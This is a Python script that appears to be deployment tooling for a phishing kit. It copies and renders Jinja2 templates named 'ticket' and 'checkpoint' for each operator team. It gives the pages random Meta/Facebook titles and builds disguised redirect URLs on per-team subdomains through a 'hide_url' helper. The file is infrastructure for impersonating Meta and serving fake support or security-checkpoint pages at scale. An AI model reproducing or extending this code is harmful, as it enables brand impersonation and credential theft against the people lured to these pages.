from jinja2 import Environment, FileSystemLoader
import os
import json
import shutil
from faker import Faker
import fake_objects
import random as r
import urllib
from domains_data import DOMAINS_DATA
from sub_generator import get_sub_domain, hide_url

TEAMS_DISS_DIR = 'teams_html'
TEMPS_DIR_NAME = 'temp'
DISS_PATH = '/home/vlad/FB/diss'

DISS = {
    'mpc': {'dir_name': 'MPC', 'templates': ['ticket/index.html', 'index.html'], 'endpoint': 'ticket', 'is_redirect': False},
    'spi': {'dir_name': 'SPI', 'templates': ['checkpoint/index.html', ], 'endpoint': 'checkpoint', 'is_redirect': False},
    'spi_new': {'dir_name': 'SPI_new', 'templates': ['ticket/index.html', ], 'endpoint': 'ticket', 'is_redirect': False},
    'white_redirect': {'dir_name': 'WHITE_REDIRECT', 'templates': ['index.html', ], 'endpoint': None, 'is_redirect': True},

}


class Dis:

    def __init__(self, data: dict):
        self.path = os.path.join(DISS_PATH, data['dir_name'])
        self.templates = data['templates']
        self.is_redirect = data['is_redirect']

    def clear_teams_dir(self):
        """Отчистить папку с копиями"""
        teams_copys_path = os.path.join(self.path, TEAMS_DISS_DIR)
        for diss_copy_name in os.listdir(teams_copys_path):
            shutil.rmtree(os.path.join(teams_copys_path, diss_copy_name))

    def _get_random_title(self):
        items = [
            'Meta',
            'Facebook',
            'Meta | Facebook',
            'Meta for Business',
        ]
        return r.choice(items)

    def _get_redirect_url(self,team):
        domain_data = DOMAINS_DATA[team.id]
        domain = domain_data['domain']
        domain_dis = domain_data['diss'].lower()
        dis_endpoint = DISS[domain_dis]['endpoint']
        team_sub_domain = f'{get_sub_domain()}{team.id}'
        domain_redirect = f'https://{team_sub_domain}.{domain}/{dis_endpoint}/'
        res = {
            'domain_redirect': hide_url(domain_redirect)
        }
        return res

    def _get_context(self,team):
        context = {
            'fake_objects': fake_objects,
            'title': self._get_random_title()
        }
        if self.is_redirect:
            context.update(self._get_redirect_url(team))
        return context

    def render_copy(self, team):
        copy_path = self.make_copy_for_team(team)
        context = self._get_context(team)
        context['team'] = team
        self.render_diss(copy_path=copy_path, context=context)

    def make_copy_for_team(self, team):
        dis_temp_path = os.path.join(self.path, TEMPS_DIR_NAME)
        path_to_copy = os.path.join(self.path, TEAMS_DISS_DIR, team.name)
        shutil.copytree(dis_temp_path, path_to_copy)
        return path_to_copy

    def render_diss(self, copy_path, context):
        for temp_rel_path in self.templates:
            temp_path = os.path.join(copy_path, temp_rel_path)
            with open(temp_path, ) as temp_file:
                text = temp_file.read()
            environment = Environment()
            template = environment.from_string(text)
            result = template.render(context)
            with open(temp_path, 'w') as temp_file:
                temp_file.write(result)


class Team:

    def __init__(self, data: dict):
        self.id = data['id']
        self.name = data['name']
        self.service_id = data['service_id']
        self.user_id = data['user_id']
        self.template_id = data['template_id']

    def __str__(self):
        return self.id


def get_teams():
    with open('teams.json') as file:
        teams_data = json.load(file)
        return [Team(data) for data in teams_data]


TEAMS = get_teams()

dis = Dis(DISS['white_redirect'])
dis.clear_teams_dir()
for team in TEAMS:
    if team.name in ['hnd1',]:
        dis.render_copy(team)

